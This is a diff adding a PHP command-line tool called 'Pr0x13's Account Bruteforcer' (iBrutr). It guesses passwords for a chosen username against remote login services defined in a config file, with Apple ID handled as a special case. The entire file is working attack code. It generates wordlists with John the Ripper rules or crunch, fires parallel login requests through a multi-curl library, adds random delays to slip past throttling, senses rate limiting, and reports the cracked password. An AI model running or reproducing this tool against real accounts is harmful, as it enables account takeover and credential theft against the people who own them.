@@ -1,0 +1,321 @@
+<?php
+ini_set('max_execution_time', 0);
+ob_implicit_flush(true);
+$cc = "\033[0m";
+$rg = "\033[47;31m";
+$g = "\033[;1;32m";
+$lb = "\033[;1;34m";
+$r = "\033[;1;31m";
+$b = "\033[;1;30m";
+$rb = "\033[41;30m";
+$br = "\033[40;31m";
+$bg = "\033[40;1;32m";
+$c = "\033[36m";
+$cl =  "\033[47;36m";
+if ($argc < 2){
+        print "\n       {$g}-~=<{$cc}{$lb}Pr0x13's Account Bruteforcer{$cc}{$g}>=~-{$cc}\n\n";
+        print "{$r} Usage: {$cc}{$rg}php iBrutr {username} {options}{$cc}\n\n";  
+        print "  -{$b}u{$cc}{$r} [{$cc}{$b}username{$cc}{$r}]{$cc}\n";        
+        print "  -{$b}b{$cc}{$r} [{$cc}{$b}bruteforce{$cc}{$r}]{$cc}\n";
+        print "  -{$b}w{$cc}{$r} [{$cc}{$b}wordlist{$cc}{$r}]{$cc}\n";
+        print "  -{$b}m{$cc}{$r} [{$cc}{$b}mangle{$cc}{$r}]{$cc}\n"; 
+        print "  -{$b}t{$cc}{$r} [{$cc}{$b}time{$cc}{$r}]{$cc}\n";
+        print "  -{$b}r{$cc}{$r} [{$cc}{$b}randomTime{$cc}{$r}]{$cc}\n";
+        print "  -{$b}y{$cc}{$r} [{$cc}{$b}updateConfig{$cc}{$r}]{$cc}\n";
+        print "  -{$b}h{$cc}{$r} [{$cc}{$b}help{$cc}{$r}]{$cc}\n";
+        print "  -{$b}d{$cc}{$r} [{$cc}{$b}debug{$cc}{$r}]{$cc}\n\n";         
+        print "\n";
+        exit(1);
+}    
+$opts = getopt("b:dmr:t:u:w:xy");
+foreach (array_keys($opts) as $opt) switch ($opt) {
+ case 'd':
+   $debug = $opts['d'];
+ break;
+ case 't':
+   $argtime = $opts['t'];
+ break;
+ case 'r':
+   $randomtime = $opts['r'];
+ break;
+ case 'u':
+   $argusername = $opts['u'];
+ break;
+ case 'b':
+   $bruteforce = $opts['b'];
+ break; 
+ case 'w':
+   $argwordlist = $opts['w'];
+ break;
+ case 'm':
+   $mangle = $opts['m'];
+ break;
+  case 'x':
+   $test = $opts['x'];
+ break;
+ case 'y':
+   $argupdate = $opts['y'];
+ break;
+}
+if (isset($argupdate)){
+print "\n {$g}Fetching most recent config file!{$cc} \n";
+$curl = curl_init();
+curl_setopt_array($curl, array(
+    CURLOPT_RETURNTRANSFER => 1,
+    CURLOPT_URL => 'https://test.com/config.json',
+    CURLOPT_USERAGENT => 'iBrutr/Updater'));
+$getconfig = curl_exec($curl);
+file_put_contents('./files/config.json', $getconfig);
+curl_close($curl);
+exit(0);
+}
+if (isset($argwordlist)){
+print "\n {$cl}$argwordlist{$cc} \n";
+}
+$data = json_decode ( file_get_contents ( './files/config.json',true ),true );
+print "{$r}\nPlease choose a target!!{$cc}\n\n";
+$i=0;
+foreach($data as $key => $val) {
+    print($lb.$key).$cc." {$bg}[$i]{$cc}\n";    
+    $value[$i] = $val;
+    $brutetypekey[$i] = $key;    
+   ++$i;
+}
+unset($i);
+print "\n";
+$handle = fopen ("php://stdin","r");
+$line = fgets($handle);
+$line = trim($line);
+if(is_numeric($line) !== TRUE):
+   print "\n{$rb}MUST BE A NUMBER!! ABORTING!{$cc}\n";
+    exit;
+elseif($line>=count($value)):
+   print "\n{$rb}OUT OF BOUNDS!! ABORTING!{$cc}\n";
+    exit(0);
+endif;
+$brutetype = $brutetypekey[$line];
+$brutechoice = $value[$line];
+unset($handle);
+unset($line);
+$i = 0;
+foreach ($brutechoice as $choicearray) {  
+    foreach($choicearray as $key => $val) {
+       if($key == "server")
+          $servers[$i] = $val;
+       if($key == "port")
+          $ports[$i] = $val;
+       if($key == "method")
+          $methods[$i] = $val;
+       if($key == "tech")
+          $techs[$i] = $val;
+       if($key == "payloadaddr")
+          $payloadaddrs[$i] = $val;
+       if($key == "useragent")
+          $useragents[$i] = $val;
+       if($key == "payload")
+          $payloads[$i] = $val;
+       if($key == "headers")
+          $headers[$i] = $val;
+       if($key == "options")
+          $options[$i] = $val;                      
+    } 
+                $i++;
+}
+
+//Header Parser
+for($i = 0; $i < count($headers);$i++){
+  for($x = 0; $x < count($headers[$i]);$x++){
+    if ($headers[$i][$x] == 'Host: $server')
+       $headers[$i][$x] = 'Host: '.$servers[$i];
+    if ($headers[$i][$x] == 'User-Agent: $useragent')
+       $headers[$i][$x] = 'User-Agent: '.$useragents[$i];    
+    if ($headers[$i][$x] == 'Referer: http://$server:$port/')
+       $headers[$i][$x] = 'Referer: http://'.$servers[$i].":".$ports[$i]."/";
+    if ($headers[$i][$x] == 'Content-length: ')
+       $headers[$i][$x] = 'Content-length: '.strlen($payloads[$i]);         
+     }
+}
+
+//CURLOPTS Parser
+$curlopts[0] = '$useragent';
+$curlopts[1] = '$headers';
+$curlopts[2] = '$username.":".$pass';
+$curlopts[3] = '$payload';
+$curlopts[4] = '$port';
+for ($i = 0; $i < count($options); ++$i) {
+ for ($x = 0; $x < count($curlopts); ++$x) {
+    foreach($options[$i] as $key=>$value) {
+        if($curlopts[$x]===$value){ 
+            $optkeys[$x] = $key;
+         }       
+      }   
+   }
+}
+for ($i = 0; $i < count($options); ++$i) {
+if(isset($optkeys[0]))://useragent
+$a = $optkeys[0];
+$options[$i][$a] = $useragents[$i];
+unset($a);
+endif;//
+if(isset($optkeys[1]))://headers
+$a = $optkeys[1];
+$options[$i][$a] = $headers[$i];
+unset($a);
+endif;//
+if(isset($optkeys[4]))://port
+$a = $optkeys[4];
+$options[$i][$a] = $ports[$i];
+unset($a);
+endif;//
+}
+print "\n";
+if (isset($test)):
+for ($i = 0; $i < count($servers); ++$i) {
+  $servers[$i] = "127.0.0.1";
+  $payloadaddrs[$i] = "";
+  $argusername = "test";
+  $ports[$i] = "8888";
+}
+endif;
+if (isset($debug)){
+     print "\n\n";
+     print "\n  {$lb}Attacking {$cc}{$r}servers{$cc}: {$bg}{$servers[0]},{$servers[1]}{$cc}{$lb}\n  over {$cc}{$r}ports{$cc}: {$bg}{$ports[0]},{$ports[1]}{$cc}\n";
+     print "\n  {$lb}Using: {$cc}{$bg}{$payloadaddrs[0]},{$payloadaddrs[1]}{$cc}\n";
+     print "\n  {$lb}Method: {$cc}{$bg}{$methods[0]},{$methods[1]}{$cc}\n\n";     
+}
+print "\n{$br}Are you sure you want to bruteforce this server?  Type 'y' to continue:{$cc}";
+$handle = fopen ("php://stdin","r");
+$line = fgets($handle);
+if(trim($line) !== 'y'):
+   print "\n{$rb}ABORTING!{$cc}\n";
+    exit;
+endif;
+print "\n{$bg}~~====<Getting Wordlist>====~~{$cc}";
+if (isset($mangle)):
+  if (isset($argwordlist)):
+    $file_handle = shell_exec("./tools/john --wordlist={$argwordlist} --rules --stdout"." 2>&1");
+   else:
+    $file_handle = shell_exec("./tools/john --wordlist=./files/mangle.lst --rules --stdout"." 2>&1");
+  endif;  
+ elseif (isset($bruteforce)):
+  $file_handle = shell_exec("./tools/crunch {$bruteforce} {$bruteforce} -f ./tools/charset.lst mixalpha-numeric-symbol"." 2>&1");
+ elseif (isset($argwordlist)):
+   if (is_readable($argwordlist)):
+       $file_handle = file_get_contents($argwordlist);
+    else:
+      die( "\n\n{$rb}  Wordlist either doesn't exist or isn't readable!{$cc}\n\n" );
+      exit(1);
+   endif;  
+ else: 
+   if (is_readable("./files/wordlist.lst")):
+       $file_handle = file_get_contents('./files/wordlist.lst');
+    else:
+      die( "\n\n{$rb}  Wordlist either doesn't exist or isn't readable!{$cc}\n\n" );
+      exit(1);
+   endif;  
+endif;
+print "\n{$bg}~~====<Getting EpiCurl>====~~{$cc}";
+include './modules/EpiCurl.php';
+sleep(1);
+print "\n{$bg}~~====<Starting Multi Curl Instance>====~~{$cc}";
+$mc = EpiCurl::getInstance();
+sleep(1);
+$v = 0;
+if(isset($file_handle)):
+$file = explode("\n", $file_handle);
+$length = count($file);
+print "\n{$bg}~~====<Dividing Wordlist>====~~{$cc}";
+$chunks = array_chunk($file, 100);
+sleep(1);
+print "\n{$bg}~~====<Building Missiles!>====~~{$cc}";
+foreach ($chunks as $i => $chunk) {       
+ if (isset($randomtime)):
+      $time = mt_rand(2, $randomtime);
+  elseif (isset($argtime)):    
+      $time = $argtime;
+  else:
+      $time = 2;
+ endif;
+ if ($v < 1):
+      print "\n{$br}~~====<Arming Silo!>====~~{$cc}";
+  else:
+      print "\n{$br}~~====<Re-Arming!>====~~{$cc}";
+ endif;
+sleep($time);            
+$slices = array_chunk($chunk, 10);      
+foreach ($slices as $y => $slice) {
+$aslice0 = array_slice($slice, 0, 5);
+$aslice1 = array_slice($slice, 5, 10);  
+for($s = 0; $s < count($aslice0);$s++){         
+$pass[0] = rtrim($aslice0[$s]);
+if ($aslice1 == NULL):
+else:
+$pass[1] = rtrim($aslice1[$s]);
+endif;
+ if ($pass[0] == ""):
+   print "\n{$rb} eek! we ran out of passwords...{$cc}\n";
+   exit(0);
+ endif; 
+
+//More CURLopts Stuff to execute inside loop
+for ($o = 0; $o < count($options); ++$o) {
+if(isset($optkeys[2]))://userpwd
+$a = $optkeys[2];
+if (isset($pass[1])):
+$options[$o][$a] = $argusername.":".$pass[$o];
+else:
+$options[$o][$a] = $argusername.":".$pass[0];
+endif;
+unset($a);
+endif;//
+if(isset($optkeys[3]))://post payload
+$a = $optkeys[3];
+$options[$o][$a] = $payloads[$o];
+unset($a);
+endif;//
+}
+for ($x = 0; $x < count($pass); ++$x) {
+      $missiles[$x] = $mc->addURL($servers[$x].$payloadaddrs[$x], $options[$x]);
+}//REMOVE THESE LINES FOR MORE CONTROL
+$v++;
+for ($x = 0; $x < count($pass); ++$x) {//REMOVE THESE LINES FOR MORE CONTROL
+if($missiles[$x]->code == 0){       
+           die( "\n\n{$rb}  Could not Resolve Connection!!!{$cc}\n\n" );
+ 	   exit(1);     
+     }
+if ($brutetype == "APPLE ID"):     
+$buffer = [];
+array_push($buffer, $missiles[$x]->data);
+foreach ($buffer as $responsedata) { 
+   if ($missiles[$x]->code == "401"){ 
+           print "{$r}->{$cc}";
+   }elseif(strpos($responsedata, "tokens") == true){ 
+           die( "\n\n{$rb}  Success! The password is:{$cc} {$g}{$pass[$x]}{$cc}\n\n" );
+	   exit(1);
+   }else{        
+           die( "\n\n{$rb}  Rate Limiting is Probably on!!!{$cc}\n\n" );
+	   exit(1);
+    }                
+}                 
+$buffer = array_shift($buffer);
+else:
+//USE THIS IF YOU ONLY KNOW INCORRECT LOGIN INFO,REMOVE BUFFER CHECK FUNCTION,DISABLES RATE LIMIT SENSING!! 
+if (strpos($missiles[$x]->data, "bad login string") == true){  
+        print "{$r}->{$cc}"; 
+}else{
+        die( "\n\n{$r}  Success!{$cc} The password is: {$g}{$pass}{$cc}\n\n" );
+	exit(1);
+        }
+endif;
+  }
+          }
+    unset($x);
+      }
+    unset($i);   
+}
+endif;
+unset($file_handle);
+ob_end_flush();
+ob_end_clean();
+exit(1);
+?>
